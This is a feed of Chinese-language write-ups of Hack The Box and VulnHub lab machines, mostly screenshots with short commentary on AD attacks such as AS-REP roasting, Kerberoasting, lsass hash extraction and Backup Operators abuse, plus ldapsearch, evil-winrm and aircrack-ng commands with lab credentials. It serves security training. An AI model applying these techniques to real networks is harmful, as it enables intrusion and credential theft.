&lt;p&gt;-b指定basedn查询，分辨名，唯一标识，根&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ldapsearch -H ldap://10.10.11.174 -D ldap@support.htb -w &amp;#39;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&amp;#39; -b &amp;#34;dc=support,dc=htb&amp;#34; &amp;#34;*&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE8fea50f5a65115346894cbd65d4dd4df%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现密码，这里可以使用crackmapexec进行探测，这是一个用户内网渗透的探测工具：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE7907cef0313332cde4376717d6f59cec%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;evil-winrm工具是 Winrm 服务利用工具，需要合法用户身份信息，使用5985端口连接：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;evil-winrm -u support -p Ironside47pleasure40Watchful -i 10.10.11.174
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE58222552f72ea8805bbf63f007591aec%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;查看flag&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEa8e93bca57d16f39f255af6e70fb5c09%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;BloodHound是一款用于域分析的强大工具，它可以帮助安全专业人员识别和分析Active Directory（AD）环境中的攻击路径和权限问题。本文将介绍BloodHound的基本概念，并提供一些使用BloodHound进行域分析的编程实例。&lt;/p&gt;
&lt;p&gt;BloodHound的使用：&lt;/p&gt;
&lt;p&gt;启动：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1、开启neo4j数据库：
neo4j start
访问本地的7474端口即可看到web页面，默认账密：neo4j，第一次使用需要修改密码
2、kali启动BloodHound：
./BloodHound --no-sandbox
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;离线脚本使用：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1、上传windows版本的脚本，存放在以下路径：
BloodHound-linux-x64/resources/app/Collectors
2、运行即可
SharpHound.exe -c all
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;玩了半天终于玩儿明白了，原来人家回自动分析路径：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE5b4f95d646769f2b0e55d384e6720c30%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X017 blackfield</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x017-blackfield/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x017-blackfield/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEea18669927047071b2f016d741cd9f9cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEfc75e9ba6e8d681ccc511c28beec4352image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE4a7cc6b9b385446a255fed934430c98dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;值得关注服务：ldap\smb\5985&lt;/p&gt;
&lt;p&gt;smb存在匿名登录：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEc7ba8abad6771efef30f690f769ad499image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这个文件夹好像是个人文件夹，这些文件名可能是用户名，接着看ldap，没有什么有效信息：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE8f53bc5134ba6e86cf716f47ea2c4d1bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;使用刚刚smb获取到信息，进行用户名枚举：&lt;/p&gt;
&lt;p&gt;获得可用用户名三个：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEa9472104fb02cd43db957d2ff9e59bebimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;有了用户名可以尝试AS-REP：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE436a68b5e9c5043a128f88a8f9c59a09image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;破解成功：&lt;/p&gt;
&lt;p&gt;#00^BlackKnight&lt;/p&gt;
&lt;p&gt;support&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe8f7242a56316182305de35d369ef0f6image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;winrm登录失败：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEc578c613e35f8b16225d7e65422825e4image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;bloodhound.py看看吧：&lt;/p&gt;
&lt;p&gt;但是并没给出什么有用的信息：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE9e3a4f3918f84ebb4a7715cb6438436bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;psexec也失败了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE44c2f715a9111c4b0ce67010f55c0f7bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;kerberoasting：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE8ba0a51c180c93183dc8450b4f964333image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;再次查看bloodhound：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE87bd2e04203f2c43efbee1eb37d52375image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;我们可以修改AUDIT2020用户的密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE9917a62e8115593d051ae2621dd92d98image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;登录smb:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE2c928d8e4b93bd01c9d900695b627a78image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现关键内容lsass.zip&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd13f868e7c7adfb3d7f02664f65ae955image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;读了一堆hash:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf3a02507e0161c2a105cf0f74dfa07f1image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;提取出来吧：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE91e34b8a176e74c2a8b29e4d138fbb13image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;使用crackmapexec来爆破smb以获取可用hash:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE7ef8dde872b3ece13cc9c59d6ee0738fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;bloodhound可以知道，这是BACKUP OPERATORS组的：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE06bb8613fc5fb728047558ecb7567c99image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;通过查找信息，发现以下解释：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE7a04b590659e373eebf7fa1592ad9a1eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;同时还是远程管理组的：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd305227fb19a6f99cf1090fe281feb4fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x017 Victim 1</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x017-victim-1/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x017-victim-1/</guid>
      <description>&lt;p&gt;同样要修改IP地址：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEb12de8fd0af939ee2d9da7a68a39e8d5%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE3108ff06e2df581c14da45fcde7e0d11%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEe0a2852908fe6b35bf9965c4f6ff2250%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透&#34;&gt;渗透&lt;/h1&gt;
&lt;p&gt;80端口：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc4c7e213ef2eefb9febc89f71c9a564a%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;有joomla?，发现疑似账户名or密码，h@ck3rz!&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE05d28b1ed75c579999e1f006f5a051b9%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE787e9829b0e94f812afed574d08835ce%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;access.txt，但是看起来没什么用：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE32d255f6f924886490262bf49a047a6e%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;8080端口：&lt;/p&gt;
&lt;p&gt;file.php，看起是想文件包含？，但是没有php解析环境&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE1deab00812c8a7d9fc7c908c7d6f9bc1%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;8999端口，目录遍历，又是wordpress?，但是好像没有php解析环境：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEe9b5d43e5c4bb786dc4a800759a0fe93%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;9000端口：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE6c6fe22aa4f6390ba8ebc08e061051ca%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc75173120084a152588e61583d0b2672%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;后面还是看了WP，我是发现那个cap文件了的，也看到了802.11协议，但是没细想要去破解无线账号密码：&lt;/p&gt;
&lt;p&gt;aircrack-ng -w /usr/share/wordlists/rockyou.txt WPA-01.cap&lt;/p&gt;
&lt;p&gt;SSID为账号：&lt;/p&gt;
&lt;p&gt;dlink&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE5c19b2950fa79ba144636f318f6230fc%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;p4ssword&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE081e4805e0cb9a15764d0cfe823c162c%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;非常简单&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE4d2dcd47522ad0c75ff05ff3ec43a48b%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x018 dpwwn 2</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x018-dpwwn-2/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x018-dpwwn-2/</guid>
      <description>&lt;p&gt;该靶机开机可能遇到当前硬件版本不支持设备“sata”。的提示，修改兼容性即可&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE5e8448c17e7dbc6f12d292a73b987dfe%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE2c4e548f321bc7003e8021136ef5ac6e%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;好好好，搞了半天进不去grub，去vulnhub上看了一下，主机是静态IP，10.10.10.10，算了我改VM网段好伐&lt;/p&gt;
&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEe4cbea163f3b93afa0c6463ca16f409e%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEb26dc0d1cc89188c2285171de1576623%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透&#34;&gt;渗透&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE201181ef39dab2bfdb67919c9e137c04%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;可以发现是dpwwn02的家目录，但是没有写入权限，&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEfcf393a4901f21a9e7fddfcd89f340e5%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;web&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEd30195d348e34f265adaf019d628abd4%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;wpscan&lt;/p&gt;
&lt;p&gt;插件：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEb60bbfd4d88ae45387f31b37466db3fd%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;用户名：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE57e0f16b3786c2f84f40c34f292f6a4c%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;存在任意文件读取，但是不是远程文件读取：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE8e4d591203dca720b457726197741a9e%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;后面再次看了一下nfs，给了sudo成功写入了文件，配合文件包含即可getshell&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE685cd7686c5524ecfc7a7cb4a2feb216%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEfea5a81fb7a15cdc7b3c294d53e16f2b%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;比较简单&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEa8767a10b626be9e072be731dfd560ab%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X018 matis</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x018-matis/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x018-matis/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE3d970b6a64ceb598de9c74b2f94023ceimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf0a3b62c138df63b319e3dff3916bca1image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE1dbd01021a15c5e120cb0eb10a714b3cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;值得关注的服务：smb\ldap\http\mssql&lt;/p&gt;
&lt;p&gt;smb&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf38b5e691dd72fe96c35f2103d829abaimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;ldap&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE8ab1d1ac0bda3c32a45f81e853ba38a7image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;看8080了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE1b155670fd396ef80562714c70a830adimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;是两个xss：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE81e7b16c4e1676a9e4102ce64f00e7fdimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;再看1377：&lt;/p&gt;
&lt;p&gt;打开是默认页面，目录扫描发现：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE582bb4244a55f2c76bf1042a2e0800c2image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;管理员名为admin：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd737440b28e8ed71794a1f53a1f9fa36image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;文件名即为密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEa8c8db80985487890c1077cb6b3b7b38image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEdc831e0ec4488d069f2d399e09da4b70image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;那么这个密码，可能是web、sql、ldap的：&lt;/p&gt;
&lt;p&gt;web不行&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE016642942a591e30ef1e0c7a56cb7fb3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;ldap没有账户，试试mssql先：&lt;/p&gt;
&lt;p&gt;成功了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE23c3f86220690713e83de14c2b2f1948image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这里几个思路：1、收集数据库里面的数据；2、中继&lt;/p&gt;
&lt;p&gt;中继出来，发现不让用：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf0c47c4eb493491ef0bcbe77fca1c980image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE169245b6c62c284503376520afca5e2dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;第二次进行尝试的时候发现：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb1eac2c59199c4587cbfaaf927ed5325image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;xp_cmd也不让用，只能看看敏感信息了：&lt;/p&gt;
&lt;p&gt;和user有关的表就三个，查起来很快：&lt;/p&gt;
&lt;p&gt;james                J@m3s_P@ssW0rd!&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEddda5b09f0c922d0aa24c2596f1c07e8image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;再次获得账户名密码，同样的，思路有几个，1、web；2、smb；3、ldap&lt;/p&gt;
&lt;p&gt;smb看来没什么东西：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE8c13136459512adf64739a76e6190a23image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;web也登录失败：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE52f383acbeb2c8257997bae84fd5ccf3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;只剩下ldap了，直接使用bloodhound来看看吧：&lt;/p&gt;
&lt;p&gt;这个用户是可以登录的，但是没有3389和5689开放啊：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE6d0ea9fcab56aac87c67e0825c55b75cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;好像也没有什么好的线路了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd55be7a59456eefba8308b1686795c30image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X019 object</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x019-object/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x019-object/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE8a4a5bd06cc5b94d2a4c7a4bb86ab5adimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE463dd639cc418cac23c20b51d76fbdffimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE2bb8b45352e30d415f216ae75dc4ef15image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;2个http，一个winrm：&lt;/p&gt;
&lt;p&gt;80，改一下hosts:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf61552d770e37239b793daad390960aaimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现Jenkins，但是没有密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE0d95232379b880d4f594c14e44e82c81image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;注册一个就好：&lt;/p&gt;
